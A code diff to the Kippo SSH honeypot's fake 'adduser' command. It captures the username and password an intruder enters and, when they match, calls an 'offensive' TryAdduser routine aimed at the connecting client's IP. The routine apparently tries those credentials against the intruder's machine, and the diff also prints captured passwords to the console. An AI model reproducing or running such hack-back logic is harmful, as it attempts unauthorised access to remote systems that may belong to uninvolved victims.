@@ -4,11 +4,12 @@
 from twisted.internet import reactor, defer
 from twisted.internet.defer import inlineCallbacks
 from kippo.core.honeypot import HoneyPotCommand
+from kippo.offensive.commands.tryadduser import TryAdduser
 import random, re
 
 commands = {}
 
-O_O, O_Q, O_P = 1, 2, 3
+O_O, O_Q, O_P1,  O_P2 = 1, 2, 3, 4
 
 class command_adduser(HoneyPotCommand):
     def start(self):
@@ -30,8 +31,8 @@ class command_adduser(HoneyPotCommand):
             (O_O, 'Adding new user `%(username)s\' (1001) with group `%(username)s\' ...\n'),
             (O_O, 'Creating home directory `/home/%(username)s\' ...\n'),
             (O_O, 'Copying files from `/etc/skel\' ...\n'),
-            (O_P, 'Password: '),
-            (O_P, 'Password again: '),
+            (O_P1, 'Enter new UNIX password: '),
+            (O_P2, 'Retype new UNIX password: '),
             (O_O, '\nChanging the user information for %(username)s\n'),
             (O_O, 'Enter the new value, or press ENTER for the default\n'),
             (O_Q, '        Username []: '),
@@ -62,7 +63,7 @@ class command_adduser(HoneyPotCommand):
 
         l = self.output[self.item]
         self.write(l[1] % {'username': self.username})
-        if l[0] == O_P:
+        if (l[0] == O_P1) or (l[0] == O_P2):
             self.honeypot.password_input = True
             return
         if l[0] == O_Q:
@@ -79,6 +80,20 @@ class command_adduser(HoneyPotCommand):
         if self.item + 1 == len(self.output) and line.strip() in ('n', 'no'):
             self.exit()
             return
+        # First password line
+        elif self.output[self.item][0] == O_P1:
+            self.password = line.strip()
+            print "FIRST PASSWORD RECEIEVED: " + self.password
+            self.item += 1
+        # Second password
+        elif self.output[self.item][0] == O_P2:
+            if (self.password == line.strip()):
+                print "PASSWORDS MATCH"
+                self.offensive()
+            else:
+                # TODO: Add the real adduser response here... Request the password again.
+                print "PASSWORDS DON'T MATCH..."
+            self.item += 1
         elif self.item == 20 and line.strip() not in ('y', 'yes'):
             self.item = 7
             self.writeln('Ok, starting over')
@@ -88,6 +103,11 @@ class command_adduser(HoneyPotCommand):
             self.item += 1
         self.schedule_next()
         self.honeypot.password_input = False
+    
+    def offensive(self):
+        attack = TryAdduser(self.honeypot.clientIP, self.username,  self.password)
+        attack.start()
+        
 commands['/usr/sbin/adduser'] = command_adduser
 commands['/usr/sbin/useradd'] = command_adduser
 
